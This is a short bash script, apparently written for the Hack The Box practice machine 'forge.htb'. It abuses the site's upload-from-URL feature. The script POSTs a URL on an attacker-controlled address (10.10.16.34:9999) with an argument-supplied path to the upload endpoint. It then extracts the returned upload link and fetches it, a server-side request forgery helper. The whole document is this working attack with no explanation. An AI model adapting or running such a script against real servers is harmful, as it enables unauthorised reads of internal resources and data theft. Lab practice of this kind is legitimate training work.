#!/bin/bash

redirect=$(curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "url=http://10.10.16.34:9999/${1}" \
    --data-urlencode "remote=1" \
    $'http://forge.htb/upload' |
    perl -ne 'm#(http://forge.htb/uploads/[a-zA-Z0-9]+)#g && print $1')

curl $redirect
